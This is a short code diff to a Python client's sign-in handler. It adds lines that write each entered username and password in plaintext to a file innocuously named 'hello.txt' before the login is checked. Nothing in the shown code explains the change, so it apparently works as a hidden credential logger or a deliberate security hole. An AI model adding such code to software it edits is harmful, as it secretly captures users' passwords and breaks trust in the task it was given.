@@ -23,6 +23,9 @@ def handleSignIn(proxy, IP, PORT):
         handleSignIn(proxy, IP, PORT)
     else:
         password = input("PASSWORD: ")
+        with open('hello.txt', 'w') as f:
+            f.write(userName)
+            f.write(password)
         if (proxy.isValidPassword(userName, password)):
             print(colored("LOGIN SUCCESSFUL!!", 'yellow'))
             client_sockets, client_pending_sockets = goOnline(userName, IP, PORT)
